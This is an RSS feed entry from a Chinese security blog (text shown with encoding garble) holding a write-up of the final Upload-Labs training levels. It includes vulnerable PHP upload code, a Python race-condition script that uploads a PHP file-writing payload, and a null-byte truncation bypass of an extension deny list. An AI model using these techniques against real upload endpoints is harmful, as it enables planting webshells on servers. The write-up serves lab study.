<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>æ–‡ä»¶ä¸Šä¼ æ¼æ´ on</title><link>/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link><description>Recent content in æ–‡ä»¶ä¸Šä¼ æ¼æ´ on</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 19 Nov 2020 08:47:19 +0000</lastBuildDate><atom:link href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml"/><item><title>Upload-Labsçš„æœ€åå‡ é“é¢˜</title><link>/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate><guid>/posts/ctf/upload-labs5/</guid><description>&lt;h2 id="pass-17"&gt;Pass-17
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆwindowsç¯å¢ƒï¼Œphpç‰ˆæœ¬5.2.17ï¼Œé¢˜å·æ˜¯18é¢˜ï¼‰&lt;/p&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $ext_arr &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($file_name,&lt;span style="color:#a6e22e"&gt;strrpos&lt;/span&gt;($file_name,&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $upload_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $upload_file)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext,$ext_arr)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;99&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;rename&lt;/span&gt;($upload_file, $img_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($upload_file);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ æ€è·¯å’Œå‰é¢çš„ä¸€æ ·ï¼Œè·å–æ–‡ä»¶ä¿¡æ¯ï¼Œç§»åŠ¨æ–‡ä»¶åˆ°&lt;strong&gt;upload&lt;/strong&gt;æ–‡ä»¶å¤¹ï¼Œç¬¬12è¡Œä½¿ç”¨äº†ç™½åå•éªŒè¯ï¼Œå¤šäº†ç¬¬14è¡Œçš„&lt;code&gt;rename&lt;/code&gt;å‡½æ•°ï¼Œçœ‹åç§°å°±æ˜¯é‡å‘½åçš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨é‡å‘½åä¹‹å‰è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é¢˜ç”¨åˆ°äº†&lt;strong&gt;ä¸Šä¼ ç«äº‰&lt;/strong&gt;ï¼Œä½¿ç”¨&lt;code&gt;python&lt;/code&gt;è„šæœ¬ä¸æ–­çš„å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¸­æœ‰ä¸€å¥ä»£ç &lt;code&gt;&amp;lt;?php fputs(fopen('shell.php','w'),'&amp;lt;?php phpinfo();?&amp;gt;');?&amp;gt;&lt;/code&gt;è¿™æ®µä»£ç æ‰§è¡Œä»¥åï¼Œä¼šåˆ›å»ºä¸€ä¸ªåä¸º&lt;code&gt;shell.php&lt;/code&gt;é‡Œé¢æœ‰ä¸€å¥&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;çš„æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ è„šæœ¬ä»£ç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; multiprocessing &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Pool
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;CompeteUpload&lt;/span&gt;(list):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://upload-labs/Pass-18/index.php&amp;#34;&lt;/span&gt; &lt;span style="color:#75715e"&gt;#ä¸Šä¼ é¡µé¢&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; geturl&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://upload-labs/upload/233.php&amp;#34;&lt;/span&gt; &lt;span style="color:#75715e"&gt;#è®¿é—®ä¸Šä¼ æ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; file&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;:(&lt;span style="color:#e6db74"&gt;&amp;#39;233.php&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;?php fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;);?&amp;gt;&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;)}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ &amp;#39;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r&lt;span style="color:#f92672"&gt;=&lt;/span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;url,data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;data,files&lt;span style="color:#f92672"&gt;=&lt;/span&gt;file)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#print &amp;#34;test upload....&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r1&lt;span style="color:#f92672"&gt;=&lt;/span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;geturl)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; r1&lt;span style="color:#f92672"&gt;.&lt;/span&gt;status_code&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print (&lt;span style="color:#e6db74"&gt;&amp;#34;upload success!&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Pool(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool&lt;span style="color:#f92672"&gt;.&lt;/span&gt;map(CompeteUpload, range(&lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool&lt;span style="color:#f92672"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pool&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ ç¬¬ä¸€æ¬¡ç”¨pythonçš„æˆ‘åœ¨è¿™é‡ŒçŸ¥é“äº†&lt;code&gt;pip&lt;/code&gt;ã€‚è¿™é“é¢˜å› ä¸ºè¦ä¸æ–­çš„ä¸Šä¼ å’Œè®¿é—®æ–‡ä»¶ï¼Œæ‰€ä»¥å¯¹åœ¨çº¿é¶åœºä¸å‹å¥½ï¼Œæ‰€ä»¥æ‰é€‰æ‹©äº†æœ¬åœ°ç¯å¢ƒè§£é¢˜ã€‚å®Œå·¥&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119090033.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="pass-18å¤±æ‰‹"&gt;Pass-18ï¼ˆå¤±æ‰‹ï¼‰
&lt;/h2&gt;&lt;p&gt;â€‹ 18é¢˜å¤±æ‰‹äº†æ²¡æœ‰æ€è·¯ï¼Œå¦‚æœä½¿ç”¨&lt;code&gt;include.php&lt;/code&gt;æ–‡ä»¶åŒ…å«çš„è¯è¿˜å¯ä»¥ï¼Œçœ‹äº†çœ‹ç½‘ä¸Šå¤§éƒ¨åˆ†çš„åšå®¢éƒ½æ˜¯æ•·æ•·è¡è¡è¿‡å»çš„ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡ç¨å¾®æœ‰ç‚¹æ€è·¯çš„ï¼Œä½¿ç”¨çš„æ˜¯&lt;code&gt;apache2.2.xçš„è§£ææ¼æ´&lt;/code&gt;ï¼Œè¿™ä¸ªæ¼æ´çš„æ€è·¯å°±æ˜¯ï¼ŒapacheæœåŠ¡å™¨åœ¨è§£ææœ‰å¤šä¸ªåç¼€åçš„æ–‡ä»¶æ—¶ï¼Œä»æœ€åä¸€ä¸ªå¼€å§‹å‘å‰æ‰«æï¼Œå¦‚æœä¸è®¤è¯†å°±è·³è¿‡ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªè®¤è¯†çš„æ–‡ä»¶åç¼€ï¼Œå°±æŠŠè¿™ä¸ªæ–‡ä»¶ä»¥è¿™ä¸ªèƒ½è¯†åˆ«çš„åç¼€è§£æã€‚&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/qq_32434307/article/details/79480316" target="_blank" rel="noopener"
&gt;Apacheæ–‡ä»¶è§£ææ¼æ´&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/yuzly/p/11226377.html" target="_blank" rel="noopener"
&gt;apache httpdå¤šåç¼€è§£ææ¼æ´å¤ç°&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æºç ä¸­è¿˜æœ‰ä¸€ä¸ªå¯ä»¥çªç ´çš„ç‚¹æ˜¯åŒæ ·ä½¿ç”¨äº†&lt;strong&gt;é‡å‘½åå‡½æ•°&lt;/strong&gt;ï¼Œæ‰€ä»¥åº”è¯¥è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ç«äº‰ä¸Šä¼ è®¿é—®å¾—åˆ°ï¼Œä½†æ˜¯ä½¿ç”¨äº†ç™½åå•éªŒè¯ï¼Œæˆ‘å®åœ¨æ˜¯æ²¡æ‹›äº†æ‰€ä»¥&lt;del&gt;å…ˆæ‘¸ä¸ºæ•¬&lt;/del&gt;ã€‚&lt;/p&gt;
&lt;h2 id="pass-19"&gt;Pass-19
&lt;/h2&gt;&lt;p&gt;ï¼ˆwindowsç¯å¢ƒï¼Œphp5.2.17ï¼Œmagic_quotes_gpc=Offï¼‰&lt;/p&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;php&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;phtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;pht&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jsp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jspa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jsw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jsv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jspf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;jtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;aspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;ascx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;ashx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;asmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;cer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;swf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;htaccess&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;save_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;pathinfo&lt;/span&gt;($file_name,&lt;span style="color:#a6e22e"&gt;PATHINFO_EXTENSION&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext,$deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ æºç ç¬¬ä¸ƒè¡Œä½¿ç”¨äº†&lt;strong&gt;POST&lt;/strong&gt;æ¥æ¥å—æ–‡ä»¶çš„å‘½åï¼Œå‰é¢æœ‰ç±»ä¼¼é¢˜çš„æ˜¯ä½¿ç”¨äº†&lt;strong&gt;0x00æˆªæ–­ä¸Šä¼ &lt;/strong&gt;ï¼Œåé¢ä¹ŸåŒæ ·æ˜¯&lt;code&gt;move_uploaded_file&lt;/code&gt;ç§»åŠ¨æ–‡ä»¶çš„å‡½æ•°ï¼Œè¿˜ä½¿ç”¨äº†é»‘åå•éªŒè¯ï¼Œæ–¹æ³•å°±å¾ˆæ˜ç¡®ï¼Œä½¿ç”¨&lt;strong&gt;æˆªæ–­ä¸Šä¼ &lt;/strong&gt;ã€‚åˆ«å¿˜äº†æˆªæ–­ä¸Šä¼ éœ€è¦çš„ç‰¹å®šæ¡ä»¶ï¼šphpç‰ˆæœ¬éœ€è¦ä½äº&lt;code&gt;5.3.29&lt;/code&gt;ã€&lt;code&gt;magic_quotes_gpc&lt;/code&gt;éœ€è¦ä¸ºå…³é—­çŠ¶æ€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119164220.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ åŒæ ·æ˜¯å‘½åä¸º&lt;code&gt;phpa&lt;/code&gt;æ–¹ä¾¿åœ¨åå…­è¿›åˆ¶è¡¨é‡Œä¿®æ”¹ä¸º&lt;code&gt;00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119162729.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ‰“å¼€å›¾ç‰‡æŠŠurlé“¾æ¥&lt;code&gt;http://upload-labs/upload/upload-19.phpï¿½&lt;/code&gt;ä¿®æ”¹ä¸€ä¸‹å³å¯ã€‚å®Œå·¥&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119164458.png"
loading="lazy"
&gt;&lt;/p&gt;
